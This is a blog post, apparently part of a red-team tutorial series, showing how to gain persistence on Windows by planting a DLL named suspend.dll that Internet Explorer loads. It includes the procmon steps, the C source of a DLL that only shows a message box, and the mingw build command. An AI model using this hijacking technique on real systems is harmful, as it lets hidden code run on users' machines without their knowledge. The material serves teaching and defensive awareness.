---
title:  "Malware development: persistence - part 15. Internet Explorer. Simple C++ example."
date:   2022-10-12 03:00:00 +0300
header:
  teaser: "/assets/images/75/2022-10-13_00-24_1.png"
categories:
  - malware
tags:
  - malware
  - windows
  - persistence
  - red team
  - win32api
---

﷽

Hello, cybersecurity enthusiasts and white hackers!     

![pers](/assets/images/75/2022-10-13_00-24_1.png){:class="img-responsive"}    

This post is the result of my own research into one of the interesting malware persistence trick: via Internet Explorer.     

### internet explorer

In one of my [previous posts](/pentest/2021/10/12/dll-hijacking-2.html) I wrote about real world example of DLL hijacking. In this time the victim is Internet Explorer. Surely many of you do not even use it and are unlikely to deleted it on purpose from Windows system.    

### practical example

As in my previous post, let’s go to run [procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon) from sysinternals, and setting the following filters:    

![pers](/assets/images/75/2022-10-13_00-03.png){:class="img-responsive"}    

Then run `Internet Explorer`:     

![pers](/assets/images/75/2022-10-13_00-04.png){:class="img-responsive"}    

![pers](/assets/images/75/2022-10-13_00-04_1.png){:class="img-responsive"}    

As you can see, the process `iexplore.exe` is missing several DLLs which possibly can be used for DLL hijacking. For example `suspend.dll`:     

![pers](/assets/images/75/2022-10-13_00-05.png){:class="img-responsive"}    

Let's go to search any other probably locations, maybe we have legit DLL:    

```powershell
cd C:\
dir /b /s suspend.dll
```

![pers](/assets/images/75/2022-10-13_00-09.png){:class="img-responsive"}    

But as you can see, file not found so, this DLL is used by Internet Explorer only.    

Then, I prepared "evil" DLL, `meow-woof` messagebox:        

```cpp
/*
evil.c - malicious DLL
DLL hijacking. Internet Explorer
author: @cocomelonc
*/

#include <windows.h>
#pragma comment (lib, "user32.lib")

BOOL APIENTRY DllMain(HMODULE hModule,  DWORD  ul_reason_for_call, LPVOID lpReserved) {
    switch (ul_reason_for_call)  {
    case DLL_PROCESS_ATTACH:
      MessageBox(
        NULL,
        "Meow-woof!",
        "=^..^=",
        MB_OK
      );
      break;
    case DLL_PROCESS_DETACH:
      break;
    case DLL_THREAD_ATTACH:
      break;
    case DLL_THREAD_DETACH:
      break;
    }
    return TRUE;
}
```

### demo

Let's go to see everything in action. Compiling our evil DLL:    

```bash
x86_64-w64-mingw32-gcc -shared -o evil.dll evil.c
```

![pers](/assets/images/75/2022-10-13_00-12.png){:class="img-responsive"}    

Then naming the file `suspend.dll` and placing it in the directory where Internet Explorer is loaded:     

![pers](/assets/images/75/2022-10-13_06-13.png){:class="img-responsive"}    

![pers](/assets/images/75/2022-10-13_00-15.png){:class="img-responsive"}    

And finally try to run our victim application:     

![pers](/assets/images/75/2022-10-13_00-16_1.png){:class="img-responsive"}    

![pers](/assets/images/75/2022-10-13_00-18.png){:class="img-responsive"}    

![pers](/assets/images/75/2022-10-13_00-24.png){:class="img-responsive"}    

After we close pop-up IE work correctly, not crashed:    

![pers](/assets/images/75/2022-10-13_00-16.png){:class="img-responsive"}    

As you can see, it's worked. Perfect! =^..^=     

### conclusion

We now have achieved persistence via IE.    

That's why this post belongs to the persistence category, our malicious DLL will launch anytime user starts IE too. And, when they exit it too. Surprise for my windows lovers. You don't even have to install or remove anything.    

It's worked also on `Windows 11 x64`:     

![pers](/assets/images/75/2022-10-13_06-37.png){:class="img-responsive"}    

Although it’s unlikely that anyone will launch IE in 2022, will you agree?    

As a Windows bug hunter, if you want to find privilege escalation vulnerabilities on the operating system itself, you’ll often want to start from a blank page, with a clean installation of Windows.      

I don't know if any APT in the wild used this tactic and trick, but, I hope this post spreads awareness to the blue teamers of this interesting technique especially when create software, and adds a weapon to the red teamers arsenal.    

> This is a practical case for educational purposes only.      

[DLL hijacking](/pentest/2021/09/24/dll-hijacking-1.html)     
[DLL hijacking with exported functions](/pentest/2021/10/12/dll-hijacking-2.html)     
[source code in github](https://github.com/cocomelonc/2022-10-12-malware-pers-15)     

Thanks for your time happy hacking and good bye!   
*PS. All drawings and screenshots are mine*
